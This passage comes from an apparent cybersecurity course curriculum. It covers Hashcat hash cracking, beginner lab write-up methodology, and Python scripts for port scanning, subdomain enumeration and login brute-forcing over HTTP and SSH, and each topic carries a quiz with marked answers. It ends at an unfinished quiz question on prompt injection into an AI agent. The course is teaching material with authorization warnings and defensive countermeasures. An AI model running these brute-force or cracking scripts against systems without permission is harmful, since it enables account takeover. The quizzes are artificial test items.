   > NTLM authentication accepts the hash itself as proof of identity, so an attacker with a captured hash can authenticate to other hosts without ever recovering the plaintext password.
2. Which two protocols are described as the most common lateral-movement paths in Windows/AD environments?
   - **SMB and RDP** ✓
   - DNS and NTP
   - FTP and Telnet
   - SNMP and ICMP
   > SMB (file shares, admin shares, Pass-the-Hash) and RDP (interactive remote desktop) are the two dominant protocols attackers use to move between compromised Windows hosts.
3. What best describes 'pivoting' in the context of lateral movement?
   - **Routing traffic through a compromised host to reach network segments not directly reachable from the attacker's own machine** ✓
   - Cracking a password hash offline using a pivot table of common substitutions
   - Switching from a reverse shell to a bind shell mid-session
   - Changing the attacker's own IP address to avoid detection
   > Pivoting uses an already-compromised host as a relay/proxy to access otherwise-unreachable internal network segments.

#### 143. VulnMachines: 5 Beginner Machines (write up each) `[lab]` — Week 11

Compromise 5 beginner-difficulty VulnMachines boxes end to end, writing up the full methodology for each using the same attack-chain framing taught throughout this module.

**Key Points:**

- For each machine: recon (Nmap) -> identify a vulnerable service/version -> exploit -> privesc -> capture the flag
- Structure each write-up around the same staged attack chain used in the source material's scenarios: Stage 1 Gaining Access (recon finds a vulnerable service, an exploit delivers a payload for shell access), Stage 2 Privilege Escalation (find and abuse a misconfiguration - e.g. a permissive sudo rule or SUID binary - to reach root/admin), and, where relevant, what a real attacker would do next (data exfiltration, clearing tracks) even though a lab flag-capture stops short of that
- Write-up format: target overview, recon findings, exploitation steps, privesc path, flag, lessons learned

**Resources:**

- [VulnMachines](https://vulnmachines.com) _(platform)_
- [Hack The Box](https://www.hackthebox.com) _(platform)_
- [GTFOBins](https://gtfobins.github.io) _(link)_

**Quick Quiz:**

1. What is the correct general methodology to follow for each VulnMachines box in this lab?
   - **Recon (Nmap) -> identify a vulnerable service/version -> exploit -> privesc -> capture the flag** ✓
   - Privesc -> recon -> exploit -> flag -> Nmap
   - Exploit blindly with Metasploit before running any recon
   - Capture the flag first, then work backward to document the exploit
   > A structured methodology starts with recon to find attack surface, then moves through identification, exploitation, and privilege escalation before the flag is captured.
2. According to the lab's expected write-up format, which element should be included for each machine?
   - **The privesc path taken to reach root/admin, alongside recon findings and exploitation steps** ✓
   - Only the final flag value, with no supporting methodology
   - The target's purchase price on VulnMachines
   - A full packet capture of every byte sent, with no summary
   > The specified write-up format explicitly calls for target overview, recon findings, exploitation steps, privesc path, flag, and lessons learned.
3. Why does an Nmap scan typically come first in each machine's methodology?
   - **It identifies live services and versions, which point toward specific known vulnerabilities to research and exploit** ✓
   - It automatically exploits any vulnerability it finds
   - It cracks any password hashes found on the target
   - It is only useful after root/admin access has already been obtained
   > Recon with Nmap surfaces the open services and versions that let you research applicable exploits before attempting anything against the box.

#### 144. Lab: Crack a provided hash list with Hashcat using rockyou.txt `[lab]` — Week 11

Crack a provided list of MD5 and SHA-256 hashes using Hashcat against the rockyou.txt wordlist.

**Key Points:**

- Identify each hash's type/length before selecting the correct -m mode (32 hex characters = MD5 = mode 0; 64 hex characters = SHA2-256 = mode 1400), cross-checked against hashcat's example_hashes wiki page rather than guessed
- Run Hashcat against the full hash list in one batch and record the cracked results
- Use --username if the hash file includes usernames alongside each hash, so hashcat parses that column correctly
- Document which passwords cracked instantly vs which required additional rule sets, and note that a GPU-backed run is dramatically faster than the same job in a VM without GPU access
- Watch the status block (Recovered, Progress, Speed in kH/s) during a run to judge how close it is to completion, and confirm each result reads as hash:plaintext on its own line

```bash
hashcat -m 0 md5_hashes.txt rockyou.txt
hashcat -m 1400 sha256_hashes.txt rockyou.txt
```

**Resources:**

- [Hashcat](https://hashcat.net/hashcat/) _(tool)_
- [Hashcat example hashes wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) _(link)_
- [SecLists](https://github.com/danielmiessler/SecLists) _(tool)_

**Quick Quiz:**

1. Before selecting a Hashcat mode for a hash in the provided list, what should you check first?
   - **The hash's length/format, to determine whether it's MD5, SHA-256, or another type, and pick the matching -m value** ✓
   - Whether the file has a .txt extension
   - The victim machine's operating system version
   - Whether rockyou.txt has already been used in a previous lab
   > Different hash algorithms produce different length/format outputs, and picking the wrong -m mode means Hashcat won't recognize the hash type correctly.
2. Which command targets the SHA-256 hash batch specifically, per this lab's terminal commands?
   - **hashcat -m 1400 sha256_hashes.txt rockyou.txt** ✓
   - hashcat -m 0 sha256_hashes.txt rockyou.txt
   - john --format=md5 sha256_hashes.txt
   - hydra -m 1400 sha256_hashes.txt rockyou.txt
   > Mode 1400 in Hashcat corresponds to SHA2-256, matching the sha256_hashes.txt file, while mode 0 is reserved for MD5.
3. What should be documented after running Hashcat against the full hash list?
   - **Which passwords cracked instantly versus which required additional rule sets** ✓
   - Only the total runtime of the command, with no other detail
   - The IP address of the machine that generated the hashes
   - Nothing, since Hashcat produces its own report automatically
   > The lab explicitly calls for noting which passwords cracked quickly versus which needed more advanced rule-based mutation, to build intuition about password strength.


---

## M12: Python Scripting for Security

**Month 3** · Week 11 · 7 topics

Automation is what separates a hobbyist from a professional — this module builds practical Python scripting skills through four real security tools you'll write from scratch: a MAC changer, port scanner, subdomain brute-forcer, and login brute-forcer.

**Learning Outcomes:**

- Write and run Python scripts confidently (variables, control flow, functions)
- Use the socket and requests libraries for network programming
- Build a MAC address changer, port scanner, and subdomain brute-forcer
- Build a basic login brute-forcer against a web form

**Module Resources:**

- [Python docs](https://docs.python.org/3/) _(link)_
- [requests library docs](https://requests.readthedocs.io) _(link)_
- [Real Python](https://realpython.com) _(link)_
- [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/) _(link)_

**Module Quiz (10 questions):**

1. Which Python construct should wrap a socket connection attempt to avoid crashing the whole port scanner on one bad host?
   - **try/except around the connection logic** ✓
   - a bare for loop with no error handling
   - a lambda function
   - the argparse module
   > try/except lets the scanner gracefully continue past hosts/ports that raise errors instead of terminating the whole run.
2. In the port scanner script, what does `s.connect_ex((target, port)) == 0` actually test?
   - **Whether the TCP connection to that specific port succeeded, indicating the port is open** ✓
   - Whether the target host responds to ICMP ping
   - Whether the target's DNS record resolves correctly
   - Whether the wordlist contains a matching password
   > connect_ex() returns 0 specifically on a successful connection, which is how the scanner determines a port is open.
3. Why does the MAC changer script need to bring the interface down before changing its address, rather than changing it live?
   - **The network interface's hardware address typically cannot be changed while the interface is active/up** ✓
   - Because Python sockets require the interface to be down to import
   - Because argparse cannot parse flags while the interface is up
   - There is no real reason; it's purely cosmetic
   > Changing a MAC address while the interface is active is unreliable/unsupported on most systems, hence down -> change -> up.
4. A subdomain brute-forcer script gets a `requests.ConnectionError` on 90% of its wordlist entries. What does this most likely mean?
   - **Most guessed subdomains simply don't exist/resolve, which is expected and should be caught, not treated as a fatal error** ✓
   - The target's main domain itself is down
   - The wordlist file is corrupted
   - The script has a syntax error
   > Since most subdomain guesses won't exist, ConnectionError is the expected, common case that the script should catch and skip past.
5. Which requests.post() parameter would you use to submit form-encoded username/password data to a login endpoint?
   - **data={}** ✓
   - headers={}
   - params={}
   - json={} exclusively, never data={}
   > The data parameter sends form-encoded body content, matching how most HTML login forms submit credentials, whereas json= would send a JSON body instead.
6. What single design flaw would make a login brute-forcer script also break a well-defended production login form?
   - **It doesn't account for rate limiting, CAPTCHAs, or account lockouts a hardened production form would enforce** ✓
   - It uses too many CPU cores
   - It cannot import the requests library on Windows
   - It is incompatible with HTTPS URLs
   > The lab targets simple lab apps like DVWA precisely because production systems typically add lockouts, rate limiting, and CAPTCHAs that a naive brute-force loop doesn't handle.
7. Why is scapy specifically relevant among Python's security libraries, compared to requests or socket?
   - **It enables crafting and manipulating raw packets, beyond the higher-level abstractions socket and requests provide** ✓
   - It replaces the need for the standard library entirely
   - It is used exclusively for password hashing
   - It only works for HTTP-layer traffic
   > scapy operates at the packet-crafting level, a different and lower layer than socket's stream connections or requests' HTTP abstraction.
8. An AI assistant suggests a script that hardcodes a database password as a string literal. What is the correct response, per this module's guidance?
   - **Flag it as an insecure pattern and require it to be fixed (e.g. via environment variables) before running the script** ✓
   - Run the script as-is since AI-generated code is already validated
   - Ignore it since hardcoded secrets are only a concern in production, never in scripts
   - Paste the real password into the AI chat to ask if it's safe
   > The module explicitly calls out hardcoded secrets as a pattern AI can help spot, and the developer must still catch and fix it before running the code, never validating it by pasting real secrets into the AI tool.
9. Which single line of reasoning connects all four scripts built in this module (MAC changer, port scanner, subdomain brute-forcer, login brute-forcer)?
   - **Each automates a manual security task using core building blocks: argparse/input handling, loops, and either socket or requests** ✓
   - Each one requires a GPU to execute effectively
   - Each one is only usable on Windows
   - Each one replaces the need to learn networking concepts
   > All four scripts are variations on the same pattern: looping over inputs (ports, subdomains, passwords) using socket or requests, wrapped in basic CLI/input handling.
10. Why does the module insist AI-generated scripts be tested in an isolated lab before operational use, even though AI can speed up development significantly?
   - **Because AI-generated code hasn't been independently validated and could behave unpredictably or unsafely against real targets** ✓
   - Because isolated labs run scripts faster than production networks
   - Because AI-generated Python cannot execute outside a sandbox
   - Because operational targets block all Python-based tools automatically
   > Speed of generation doesn't guarantee correctness or safety, so validating behaviour in an isolated environment first remains essential.

### Topics

#### 145. Python Fundamentals (variables, control flow, functions, modules, libraries) `[theory]` — Week 11

The Python syntax and standard-library building blocks every script in this module relies on - variables, control flow, loops, functions, file handling, lists and dictionaries, string and OS built-ins, and the specific libraries (socket, requests, hashlib, scapy) that turn general-purpose Python into a security scripting toolkit.

**Key Points:**

- Core dynamically-typed variables: int, float, str, bool - no type declarations needed (x = 10, y = 3.14, name = "Alice", is_authenticated = True)
- Control flow: if/elif/else conditionals plus both loop forms (for i in range(5), while count < 5) are the backbone every script in this module reuses
- Functions defined with def (e.g. def greet(name): return f"Hello, {name}!") make logic reusable across scripts
- File handling uses the with open(...) context manager for both writing ("w") and reading ("r") modes, guaranteeing the file handle closes even if an error occurs partway through
- try/except (e.g. except ZeroDivisionError as e) prevents a single bad input, unreachable host, or missing file from crashing an entire security script - essential once scripts run unattended against many targets
- Modules imported with import expose OS interaction (os.getcwd(), os.system() to run shell commands, os.getenv(), os.listdir(), os.path.exists()), randomness (random.randint(), random.choice()), and timing (time.time() for epoch time, time.sleep() to pause execution) used throughout this module's brute-force and scanning scripts
- Security-relevant libraries flagged for this course: socket (network programming/port scanning), requests (web requests/scraping), hashlib (cryptographic hashing), base64 (encoding/decoding), scapy (packet manipulation and network scanning), BeautifulSoup (web scraping), pyshark (analyzing network traffic), and python-nmap (driving Nmap scans from Python)
- Lists and dictionaries (fruits[0], user["name"]) are the two data structures used to hold wordlists and credential pairs in every script that follows
- String built-ins used constantly when parsing wordlists and output: len(), .upper()/.lower(), .split()

```bash
def greet(name):
    return f"Hello, {name}!"
try:
    x = 1 / 0
except ZeroDivisionError as e:
    print(f"Error: {e}")
with open("test.txt", "w") as f:
    f.write("Hello, World!")
with open("test.txt", "r") as f:
    print(f.read())
import os
print(os.getcwd())
print(os.listdir("."))
print(os.path.exists("test.txt"))
import time
print(time.time())
time.sleep(2)
age = 20
if age >= 18:
    print("You are an adult.")
else:
    print("You are a minor.")
for i in range(5):
    print(i)

count = 0
while count < 5:
    print(count)
    count += 1
fruits = ["apple", "banana", "cherry"]
print(fruits[0])

user = {"name": "Alice", "age": 25}
print(user["name"])
print(len("Hello"))
print("hello".upper())
print("HELLO".lower())
print("hello world".split())

import os
print(os.system("ls"))
print(os.getenv("HOME"))
import random
print(random.randint(1, 100))
print(random.choice(["A", "B", "C"]))
```

**Resources:**

- [Python Docs](https://docs.python.org/3/) _(link)_
- [Real Python](https://realpython.com) _(link)_
- [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/) _(link)_

**Quick Quiz:**

1. Which statement about Python's core types is accurate?
   - **Python is dynamically typed, so variables like int, float, str, and bool need no explicit type declaration** ✓
   - Python requires every variable to be declared with an explicit type before use
   - Python has no boolean type and uses 1/0 integers instead
   - Python strings must be declared with a fixed maximum length
   > Python is dynamically typed: you assign a value and its type is inferred at runtime, with no declaration syntax required.
2. What is the purpose of a try/except block in a security script?
   - **To catch and handle runtime errors gracefully instead of letting the script crash** ✓
   - To speed up network requests by skipping error checking entirely
   - To declare a function's expected input types
   - To import external libraries conditionally based on OS
   > try/except lets a script catch anticipated errors (like a division by zero or a failed connection) and handle them without crashing the whole program.
3. Which of these libraries is specifically useful for crafting raw network packets in Python security scripts?
   - **scapy** ✓
   - hashlib
   - argparse
   - datetime
   > scapy is the security-relevant library for packet crafting, while hashlib handles hashing, argparse handles CLI arguments, and datetime handles dates/times.

#### 146. Working with Sockets & Requests in Python `[theory]` — Week 11

socket gives you raw TCP/UDP connections (the basis of a port scanner); requests gives you a friendly HTTP client (the basis of a login brute-forcer or subdomain enumerator) - and a handful of adjacent libraries round out the toolkit once raw sockets or plain requests aren't enough.

**Key Points:**

- socket.socket(AF_INET, SOCK_STREAM) opens a TCP socket; .connect_ex() attempts a connection without raising on failure
- requests.get()/requests.post() send HTTP requests and expose .status_code and .content on the response
- Always set a timeout on both sockets and requests - an unresponsive host will otherwise hang your script indefinitely
- BeautifulSoup pairs with requests for parsing the HTML of scraped pages once a raw response body needs structured extraction
- pyshark (for analyzing network traffic) and python-nmap (for driving Nmap scans from Python) are the higher-level libraries this course flags for when socket-level code alone becomes impractical

```bash
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(1)
result = s.connect_ex((ip, port))
```

**Resources:**

- [Python socket module docs](https://docs.python.org/3/library/socket.html) _(link)_
- [Requests library docs](https://requests.readthedocs.io) _(link)_
- [Real Python: Socket Programming in Python](https://realpython.com/python-sockets/) _(link)_

**Quick Quiz:**

1. What does `socket.socket(AF_INET, SOCK_STREAM)` create?
   - **A TCP socket using IPv4 addressing** ✓
   - A UDP socket using IPv6 addressing
   - An HTTP client session
   - A raw ICMP ping socket
   > AF_INET selects IPv4 addressing and SOCK_STREAM selects the TCP (stream) protocol, together forming a standard TCP/IPv4 socket.
2. Why does `.connect_ex()` get used instead of `.connect()` in a Python port scanner?
   - **connect_ex() returns an error code instead of raising an exception on failure, making it easier to test many ports in a loop** ✓
   - connect_ex() is faster because it skips the TCP handshake entirely
   - connect_ex() only works with UDP sockets
   - connect_ex() automatically retries failed connections
   > connect_ex() returns an integer error indicator rather than throwing an exception, which simplifies looping over many ports without wrapping each attempt in try/except.
3. Why should you always set a timeout on sockets and requests in a security script?
   - **An unresponsive host would otherwise hang the script indefinitely while waiting for a response** ✓
   - Timeouts are required by Python syntax and the script won't run without one
   - Timeouts automatically encrypt the connection
   - Timeouts make requests.post() send data faster
   > Without a timeout, a socket or HTTP request will block forever on an unresponsive host, which would stall automation scripts that need to move through many targets.

#### 147. Python: MAC Address Changer Script `[lab]` — Week 11

Build a command-line tool that changes a Linux network interface's MAC address - a classic first scripting project combining argparse, regex validation, and subprocess, matched directly by the mac_changer.py script in this module's material.

**Key Points:**

- argparse defines -i/--interface and -m/--mac CLI flags via add_argument(..., dest=...); a get_arguments() function wraps parser.parse_args() so main() just reads args.interface/args.new_mac
- validate_mac() checks the new MAC against the regex ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ before ever touching the interface, calling sys.exit(1) with a usage hint on a mismatch
- change_mac() runs three subprocess.run(['sudo','ip','link',...], check=True) calls in sequence: bring the interface down, set the new address, bring it back up - check=True raises subprocess.CalledProcessError automatically if any step fails, which the caller catches and exits cleanly on
- Verification isn't assumed: after changing, the script re-reads the interface with subprocess.check_output(['ip','link','show', interface]) and regex-extracts the live MAC to confirm the change actually took effect, rather than trusting the ip link command's exit code alone
- All three ip link operations require sudo, since bringing an interface down/up and changing its hardware address needs root
- Real invocation: sudo python3 mac_changer.py -i eth0 -m 00:11:22:33:44:55; the script prints [+]/[-]-prefixed status lines throughout so failures are visible immediately instead of silent

```bash
sudo python3 mac_changer.py -i eth0 -m 00:11:22:33:44:55
sudo ip link set dev eth0 down
sudo ip link set dev eth0 address 00:11:22:33:44:55
sudo ip link set dev eth0 up
import re
re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', new_mac)
result = subprocess.check_output(['ip', 'link', 'show', interface])
re.search(r'link/ether\s(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', str(result))
```

**Resources:**

- [Python argparse docs](https://docs.python.org/3/library/argparse.html) _(link)_
- [Python re (regex) module docs](https://docs.python.org/3/library/re.html) _(link)_
- [Python subprocess module docs](https://docs.python.org/3/library/subprocess.html) _(link)_

**Quick Quiz:**

1. What is the correct sequence of operations the MAC changer script performs to change an interface's MAC address?
   - **Bring the interface down, change the address, bring the interface back up** ✓
   - Change the address, then bring the interface down, then up
   - Bring the interface up, then down, then change the address
   - Only bring the interface down; the address changes automatically
   > The interface must be brought down before its hardware address can be changed via `ip link set address`, then brought back up to resume normal operation.
2. Why does the script validate the new MAC address against a regex before touching the interface?
   - **To catch malformed input early and avoid passing garbage to a system command that modifies network configuration** ✓
   - Because regex is required by Python's socket module
   - To automatically generate a random MAC if none is provided
   - Because subprocess calls fail silently unless input is regex-validated first
   > Validating input format before it's used in a subprocess call to `ip link` prevents malformed values from being passed into a command that reconfigures the network interface.
3. What role does the `subprocess` module play in this script?
   - **It lets the Python script call the system's `ip link` command to actually change the interface's address** ✓
   - It is used only to read the argparse flags
   - It provides the regex validation logic
   - It replaces the need for sudo privileges
   > subprocess is how the script shells out to `ip link set dev ... down/address/up`, since changing a MAC address is done through the OS network stack, not pure Python.

#### 148. Python: Port Scanner Script (TCP connect scan) `[lab]` — Week 11

Build a simple TCP connect-scan port scanner that accepts a target IP and port range as arguments - the same underlying technique Nmap's -sT scan uses.

**Key Points:**

- Loop over the port range, opening a new socket per port with a short timeout
- connect_ex() returns 0 on success (port open) - anything else means closed/filtered
- Print open ports as they're found so long scans give live feedback
- This module's source material has no dedicated port-scanner script, but the same connect-with-a-short-timeout-then-handle-the-result loop appears in its brute-force scripts (SSH_bruteforce.py, weblogin-bruteforce.py): iterate a list, attempt a connection/request with a timeout, catch the failure case, and print progress as you go - this scanner reuses that exact skeleton with connect_ex() standing in for the login attempt

```bash
import socket, sys
target = sys.argv[1]
for port in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print(f"[+] Port {port} is open")
    s.close()
```

**Resources:**

- [Python socket module docs](https://docs.python.org/3/library/socket.html) _(link)_
- [Nmap Reference Guide](https://nmap.org/book/man.html) _(link)_
- [Real Python: Socket Programming in Python](https://realpython.com/python-sockets/) _(link)_

**Quick Quiz:**

1. In the port scanner script, what does a return value of 0 from `connect_ex()` indicate?
   - **The port is open** ✓
   - The port is closed or filtered
   - The host is completely unreachable
   - The scan has timed out
   > connect_ex() returns 0 specifically on a successful connection, meaning the port accepted the TCP handshake and is open; any other value indicates failure.
2. This Python TCP connect-scan port scanner mirrors which Nmap scan type?
   - **Nmap's -sT (TCP connect scan)** ✓
   - Nmap's -sS (SYN stealth scan)
   - Nmap's -sU (UDP scan)
   - Nmap's -O (OS detection)
   > A full TCP connect() (or connect_ex()) to each port is exactly what Nmap's -sT scan performs at a lower level, unlike -sS which only sends a SYN and doesn't complete the handshake.
3. Why does the script print each open port as soon as it's found, rather than waiting until the entire scan finishes?
   - **To give live feedback during a long-running scan across many ports** ✓
   - Because Python cannot store results in a list
   - Because sockets can only be used once per script run
   - To avoid triggering intrusion detection systems
   > Printing results as they're discovered lets the user see progress and results in real time instead of waiting in silence for a scan spanning many ports.

#### 149. Python: Subdomain Brute-Forcer Script `[lab]` — Week 11

Build a subdomain enumerator that checks a wordlist of common subdomain prefixes against a target domain using the requests library.

**Key Points:**

- Loop a subdomain wordlist, building http://{sub}.{domain} for each entry
- A 200 status code (with a short timeout) indicates a live, resolvable subdomain
- Wrap the request in try/except requests.ConnectionError to skip non-existent subdomains cleanly
- No dedicated subdomain script exists in this module's source material, but the loop-a-wordlist-and-fire-a-requests-call-per-entry structure mirrors weblogin-bruteforce.py's pattern exactly, and the course's library list flags requests together with BeautifulSoup for precisely this kind of enumerate-then-parse-the-response workflow
- Python is favoured for this task specifically because it's easy to learn, has libraries/APIs that speed the process up, and can automate checking hundreds of candidate subdomains in minutes instead of testing each one by hand
- Subdomains are described as 'different doors to a building' - they often host separate services (login pages, admin panels, blogs, dev/staging environments) that can become entry points attackers exploit, which is why enumerating them matters for both offensive recon and defensive attack-surface review
- Practical workflow from the source material: save the script as subdomain_enum.py, run it with python3 from a terminal or IDE, enter a domain like example.com when prompted, and it prints the reachable ('live') subdomains as [+] Found: lines

```bash
import requests
subdomains = ["www", "mail", "ftp", "admin", "test", "dev"]
domain = input("Enter the domain: ")
for sub in subdomains:
    url = f"http://{sub}.{domain}"
    try:
        r = requests.get(url, timeout=3)
        if r.status_code == 200:
            print(f"[+] Found: {url}")
    except requests.ConnectionError:
        pass
python3 subdomain_enum.py
```

**Resources:**

- [Requests library docs](https://requests.readthedocs.io) _(link)_
- [SecLists](https://github.com/danielmiessler/SecLists) _(tool)_
- [HackTricks](https://book.hacktricks.wiki/) _(link)_

**Quick Quiz:**

1. How does the subdomain brute-forcer script build each URL it tests?
   - **By combining each wordlist entry with the target domain as http://{sub}.{domain}** ✓
   - By appending the wordlist entry as a URL path, e.g. http://{domain}/{sub}
   - By querying a DNS server directly using the socket module
   - By requesting a certificate transparency log API
   > The script loops a subdomain wordlist and constructs each candidate as a subdomain prefix of the target, e.g. http://www.example.com, http://mail.example.com, etc.
2. What does a 200 status code from one of the constructed URLs indicate in this script?
   - **That the subdomain is live and resolvable, so it gets printed as a finding** ✓
   - That the domain does not exist at all
   - That the wordlist has been exhausted
   - That the request timed out
   > A 200 OK response means the request succeeded, which the script treats as evidence that the guessed subdomain actually exists and resolves.
3. Why does the script wrap each request in a try/except for `requests.ConnectionError`?
   - **To skip non-existent subdomains cleanly instead of crashing when a DNS lookup or connection fails** ✓
   - To automatically retry failed subdomains three times
   - To enable HTTPS support
   - Because requests.get() cannot function without exception handling
   > Most guessed subdomains won't exist, causing a connection error; catching it lets the loop continue to the next candidate instead of terminating the script.

#### 150. Python: Application Login Brute-Forcer Script `[lab]` — Week 11

Build a login-form brute-forcer using requests.post(), detecting success by looking for a string only present on a successful login - directly matched by the weblogin-bruteforce.py script in this module's material, which brute-forces multiple usernames against a real wordlist and includes a sibling SSH-specific version showing the same pattern applied to a different protocol.

**Key Points:**

- The real script loops multiple usernames (e.g. ["admin", "username", "test"]) as an outer loop, re-opening the password wordlist file for each one - it does not assume a single fixed username
- Passwords are read line-by-line from a real wordlist path (e.g. /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt), stripped of the trailing newline, then .encode()'d to bytes before comparison since the response content is also bytes
- requests.post(target, data={"username": username, "password": password}) sends the credential pair as a normal form POST, exactly like a browser submitting the login form
- Success detection: needle.encode() in r.content checks the raw response bytes for a string like "Welcome back" that's only present on a genuinely successful login, not on a failed-login page
- Live progress feedback uses sys.stdout.write(...) with a carriage return (\r) plus sys.stdout.flush() to overwrite the same terminal line in place instead of scrolling for every attempt
- On success the script prints the valid password/username pair and calls sys.exit() immediately, stopping further attempts; on exhausting the wordlist for one username it prints 'No valid password found' before moving to the next username
- A sibling script, SSH_bruteforce.py, applies the identical wordlist-loop-then-try-credential skeleton to SSH instead of HTTP - using pwntools' ssh() to attempt the connection with a timeout=1 and catching paramiko.ssh_exception.AuthenticationException on failure, showing the same brute-force pattern generalizes across protocols
- Only ever run against your own lab targets (e.g. DVWA) - this is a noisy, easily detected technique, and the source material's own comments explicitly warn to use it only on systems you own or have permission to test
- A simpler, single-username variant of this same pattern (the module's Bruteforce_script material) flips the detection logic to check for absence instead of presence: after each requests.post(), it tests if "Login Failed" not in response.text - useful when there's a consistent failure message but no clean success string to match on
- That source material's disclaimer is explicit and worth repeating to learners: never run this against any website, system, or service without explicit legal permission - unauthorized access or misuse is described as potentially illegal and could result in criminal charges, the script ships with no real usernames or passwords, and the author/contributors accept no responsibility for misuse
- Defensive countermeasures that directly blunt this exact attack pattern: rate-limit login attempts, lock accounts after repeated failed attempts, add CAPTCHA to the login page, and enforce strong passwords plus multi-factor authentication

```bash
import requests
target = "http://127.0.0.1:8080"
needle = "Welcome back"
for password in open("passwords.txt"):
    password = password.strip()
    r = requests.post(target, data={"username": "admin", "password": password})
    if needle in r.text:
        print(f"[+] Valid password: {password}")
        break
r = requests.post(target, data={"username": username, "password": password})
if needle.encode() in r.content:
    print(f"Valid password '{password.decode()}' found for user '{username}'")
    sys.exit()
# SSH variant (SSH_bruteforce.py) using pwntools + paramiko
from pwn import *
import paramiko
try:
    response = ssh(host=host, user=username, password=password, timeout=1)
    if response.connected():
        print(f"Valid password found: '{password}'")
except paramiko.ssh_exception.AuthenticationException:
    print("Invalid password!")
# Simpler single-username variant (Bruteforce_script.py) - absence-based detection
import requests
url = "http://example.com/login"
username = "admin"
with open("passwords.txt", "r") as file:
    for line in file:
        password = line.strip()
        response = requests.post(url, data={"username": username, "password": password})
        if "Login Failed" not in response.text:
            print(f"[+] Success! Password found: {password}")
            break
        else:
            print(f"[-] Attempt failed for: {password}")
```

**Resources:**

- [Requests library docs](https://requests.readthedocs.io) _(link)_
- [DVWA (Damn Vulnerable Web Application)](https://github.com/digininja/DVWA) _(tool)_
- [SecLists](https://github.com/danielmiessler/SecLists) _(tool)_

**Quick Quiz:**

1. How does the login brute-forcer script detect a successful login attempt?
   - **By checking whether a specific 'needle' string (e.g. 'Welcome back') appears in the response text** ✓
   - By checking whether the HTTP status code is 404
   - By measuring the response time of each request
   - By checking whether the response is empty
   > The script looks for a needle string that only appears on a successful login page, since login endpoints often return 200 regardless of success or failure.
2. What does the `data={}` parameter do in `requests.post(target, data={"username": "admin", "password": password})`?
   - **It sends the given key-value pairs as form-encoded POST body data to the login endpoint** ✓
   - It sets HTTP headers for the request
   - It specifies the URL query string parameters
   - It encrypts the password before sending
   > The data parameter in requests.post() sends the dictionary as application/x-www-form-urlencoded body content, which is how most HTML login forms submit credentials.
3. Why does the topic stress running this brute-forcer only against your own lab targets like DVWA?
   - **Because it's a noisy, easily detected technique that could violate authorization/law if run against systems you don't own or have permission to test** ✓
   - Because DVWA is the only web application built with Python
   - Because the script only works on localhost for technical reasons
   - Because DVWA has no login form to brute-force
   > Login brute-forcing generates a flood of failed authentication attempts that is easily logged and detected, and running it without authorization would be illegal.

#### 151. Using AI (ChatGPT/DeepSeek) to Generate & Review Security Scripts `[theory]` — Week 11

AI assistants can meaningfully speed up writing and reviewing security tooling — but every line of AI-generated code still needs to be understood and validated before you run it against anything.

**Key Points:**

- Good uses: scaffolding a script's structure, explaining unfamiliar code, spotting insecure patterns (hardcoded secrets, missing input validation)
- Always test AI-generated scripts in an isolated lab environment before relying on them operationally
- Never paste real credentials, internal hostnames, or client data into a public AI tool as part of a prompt

**Resources:**

- [Ollama](https://ollama.com) _(tool)_
- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) _(link)_
- [GitHub Copilot](https://github.com/features/copilot) _(tool)_

**Quick Quiz:**

1. According to this topic, what is a genuinely good use of AI when writing security scripts?
   - **Scaffolding a script's structure and explaining unfamiliar code** ✓
   - Skipping code review entirely since the AI is always correct
   - Directly deploying AI-generated exploits against production systems untested
   - Storing real client credentials in the prompt for better context
   > The topic highlights scaffolding structure, explaining code, and spotting insecure patterns as legitimate uses, while warning that generated code still needs validation.
2. What does this topic warn against when using public AI tools like ChatGPT for security scripting?
   - **Pasting real credentials, internal hostnames, or client data into the prompt** ✓
   - Using AI to explain unfamiliar syntax
   - Asking AI to scaffold a script's basic structure
   - Using AI to identify missing input validation
   > Sensitive data pasted into a public AI tool's prompt may be logged, retained, or used for training, so real credentials/client data should never be included.
3. Why should AI-generated security scripts always be tested in an isolated lab environment first?
   - **Because generated code hasn't been validated and could behave unexpectedly or unsafely if run operationally** ✓
   - Because AI-generated code cannot run outside a sandbox
   - Because Python scripts require a special AI-only runtime
   - Because lab environments automatically fix any bugs in the script
   > AI-generated code, like any unreviewed code, needs to be validated for correctness and safety before it's trusted to run against real systems.


---

## M13: Hacking with AI

**Month 3** · Week 11 · 10 topics

AI is reshaping both sides of the security fight — this module covers how AI/ML is used offensively (recon automation, AI-generated phishing) and defensively (anomaly detection), the ethical boundaries involved, and hands-on use of a local AI model for security work.

**Learning Outcomes:**

- Explain the relationship between AI, ML, and Deep Learning in a security context
- Describe offensive and defensive uses of AI in cybersecurity
- Install and run a local AI model (DeepSeek via Ollama)
- Recognise prompt injection as an attack technique against AI systems
- Use AI to assist recon scripting and spot insecure code patterns

**Module Resources:**

- [Ollama](https://ollama.com) _(tool)_
- [OWASP LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/) _(link)_
- [Simon Willison: Prompt Injection series](https://simonwillison.net/series/prompt-injection/) _(link)_
- [GitHub Copilot](https://github.com/features/copilot) _(tool)_

**Module Quiz (10 questions):**

1. A security team uses labelled historical attack data to train a model that flags likely phishing emails. Which layer of the AI/ML/DL hierarchy is this?
   - **Machine Learning** ✓
   - Deep Learning specifically
   - General AI with no learning component
   - None of these; it's a static rule engine by definition
   > Training on labelled data to find patterns is the definition of ML given in the module, distinct from DL's auto-feature-discovery on large unlabelled datasets.
2. Which pairing correctly matches an offensive AI use case with its defensive counterpart from this module?
   - **Offensive: PassGAN for password recovery | Defensive: anomaly detection for logins from new locations** ✓
   - Offensive: anomaly detection | Defensive: AI-generated phishing
   - Offensive: automated incident response | Defensive: AI-evasive malware
   - Offensive and defensive AI use cases are described as identical
   > PassGAN (offensive password recovery) and anomaly detection (defensive) are explicitly listed on opposite sides of the module's offense/defense breakdown.
3. A prompt injection attack embeds malicious instructions inside a webpage that an AI agent is asked to summarise. What type of prompt injection is this?
